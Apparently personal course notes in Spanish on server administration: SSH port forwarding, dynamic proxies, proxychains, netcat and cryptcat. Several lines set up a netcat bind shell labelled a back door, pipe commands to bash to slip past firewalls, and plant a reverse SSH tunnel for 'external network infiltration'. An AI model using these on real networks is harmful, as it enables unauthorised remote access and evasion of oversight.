@@ -1,0 +1,151 @@
+
+ADMINISTRACIÓN DE SERVIDORES
+
+Escucho en el puerto 9898 y transfiero por el 80, de modo que esta máquina ahora al conectarse a localhost:9898
+ va a mostrar el sitio que está emitiendo también por el 80
+
+	ssh -Ng -L9898:localhost:80 -i ,ssh/clave.pem   [-N para que quede en segundo plano]
+
+Mostrar por puerto 10022 lo que ocurre en localhost
+	ssh -NR 10022:localhost:22 platzi
+
+	ssh -p10022 usuario@localhost
+
+
+
+|Redirecciones y Tuberías|
+
+Archiva el resultado del comando en un fichero:
+ls > archivo
+echo "hola" > archivo                      [sobreescribe]
+echo "hola" >> archivo                     [agrega al final]
+ls > archivo ; echo "hola" >> archivo      [agrega al final]
+
+
+nc -l -v -p 8080
+
+Enviar un archivo:
+[el que va a enviar abre un puerto propio, listening]
+[al que se conecte le enviará archivo001]               nc -l -v -p 8080 < archivo001
+[el que va a recibir se conecta a ese puerto]
+[hace una copia de archivo001, usar mismo nombre]       nc 127.0.0.1 8080 > archivo001
+
+
+
+Acceder a servicios adicionales:
+(es requisito tener el servicio ssh activo, chequear con netstat -ntpl):
+Local:
+Tú tienes 2 IP y me vas a permitir consultar una a través de la otra.
+ Una IP es para acceder a internet y la otra es only-host.
+ [quiero ver tu puerto 80 cuando consulte el puerto 8080]
+	ssh -l root (IP only-host del otro) -L 8080:(otra IP del otro, con salida a internet):80
+	(-l de loggin)
+chequear que se haya abierto el puerto 24 con netstat -ntpl
+ssh -l root 127.0.0.1 -p24 ... yes ... psw ... w
+salir con logout
+
+Remoto:
+Yo tengo 2 IP y te doy un permiso que salta al firewall para que consultes una de mis IP (con acceso a internet)
+ a través de mi puerto 8080 de la otra (la only-host)
+	ssh -l root (una IP propia) -R 80:(otra IP propia):8080
+
+
+Ver https://www.lifewire.com/free-remote-access-software-tools-2625161
+
+Túnel dinámico nos permite abrir un socket, x ej un proxy (todos los puertos)
+ssh -l root (IP) -D 8080
+Volver a mirar 08x04
+
+
+
+[descargar Terminator]---------------------------------------------------------------------------------------------
+
+netstat -ntpl   [ver puertos, servicio ssh por puerto 22 tiene que estar habilitado]
+[] ssh -l root 192.168.57.2 -L 24:192.168.10.86:22  [IP propia eth0, IP propia eth1]
+[cuando me conecto a esta ip por ssh, pueda ver la otra ip por puerto 24 que está cerrado]
+
+[] ssh -l root 127.0.0.1 -p 24
+netstat -ntpl   [ir chequeando]
+w   [conexiones]
+
+-------------------------------------------------------------------------------------------------------------------
+
+Externa
+ssh -l root 192.168.10.86 -L 8080:192.168.57.9:3389
+rdesktop 127.0.0.1:8080   [acceso remoto vía puerto 8080]
+
+-------------------------------------------------------------------------------------------------------------------
+
+Triangular el acceso a servicios
+ssh -l root 192.168.10.86 -R 8081:216.58.222.238:80
+	[te habilito un puerto para que te conectes externamente a google]
+nc -vvvv 127.0.0.1 8081 [+ "head" +enter +enter]
+chequear con nmap 127.0.0.1 -p 8081
+chequear con nmap -sV 127.0.0.1 -p 8081
+logout
+
+habilitar todos los puertos de una vez [como TOR]
+ssh -l root 192.168.10.86 -D 9090   [abriendo un puerto dinámico]
+[en firefox pref avanzado red conf manual del proxy socks 127.0.0.1 8080 socks v.5, borrar no usar proxy para]
+
+apt install proxychains
+vim /etc/proxychains.conf
+	comentar strict_chain y comentar socks4 en defaults set to "tor" ..... y tipear socks 5 127.0.0.1 9090
+sudo systemctl start ssh   [verificamos que esté activo]
+netstat -ntpl
+ssh -l root 127.0.0.1 -D 9090
+ping 8.8.8.8   [para que no caiga la conexión]
+netstat -ntpl
+proxychains nmap -sP 192.168.57.0/27   [túnel]  sP es escaneo usando ping
+
+----------------------------------------------------------------------------------------------
+
+|Netcat|
+nc [dominio] 80 [HEAD]   ... diferenciar dominio general de particular con www.
+
+[en servidor] nc -l -v -p 8080 [abre puerto -listening -verbose (solicitud de detalles) -port y registra]
+[en cliente]  nc 3.134.84.152 8080 [comienza chat vía puerto 8080]
+
+[en servidor] nc -l -v -p 8080 < archivo [que envíe la info que está en archivo]
+[en cliente]  nc 3.134.84.152 8080 > archivo [que reciba la info que está en archivo, por cierto puerto predeterminado]
+
+[en servidor] nc -l -u -vv -p 8080 [igual pero UDP en vez de TCP]
+[en cliente]  nc -u 3.134.84.152 8080
+
+[en servidor] nc -l -v -p 8080 -e /bin/bash [queda a la espera de ejecutar comandos a solicitud]
+[en cliente]  nc 3.134.84.152 8080 [ejecuta comandos en el servidor pero apoderándose de los resultados]
+back door
+Se bifurca para dispersar y así evitar al firewall...
+
+[en servidor]     nc -l -v -p 8080 | /bin/bash | cryptcat -l -v -p 9090
+[en cliente]      nc 127.0.0.1 8080
+[en otro cliente] nc 127.0.0.1 9090
+... desde un cliente se le envía un comando bash, el servidor lo ejecuta y envía al otro
+
+... con -k en vez de -l debería permanecer la conexión abierta luego de la ejecución, según wikipedia
+Desventaja de Netcat: todo va en texto plano, queda registrado, lo ven el firewall y el auditor humano [ver en wireshark]
+
+----------------------------------------------------------------------------------------------------------------------------------
+
+|Cryptcat|   [igual a netcat pero agrega una capa ssl]
+[en servidor] cryptcat -l -v -p 8080
+[en cliente]  cryptcat 127.0.0.1
+
+[en servidor] cryptcat -l -v -p 8080 | /bin/bash | cryptcat -l -v -p 9090
+[en cliente]  cryptcat 127.0.0.1 8080
+[en otro cliente] cryptcat 127.0.0.1 9090
+
+... y todo va cifrado
+
+
+----------------------------------------------------------------------------------------------------------------------------------
+
+INFILTRACIÓN EXTERNA DE RED
+Hay que dejar un dispositivo con acceso a la red
+[dispositivo interno] ssh -l root (IP o DNS) -R 9090:127.0.0.1:22 ping 8.8.8.8
+[dispositivo externo 1 al interno] ssh -l root (IP o DNS) -L 8081:127.0.0.1:9090 ping 8.8.8.8
+[dispositivo externo 2g al interno] ssh -l root 127.0.0.1 -p 8081
+w
+Al jalar el puerto remoto, ya tengo acceso al localhost
+nmap -sP 192.168.57.0/27
+
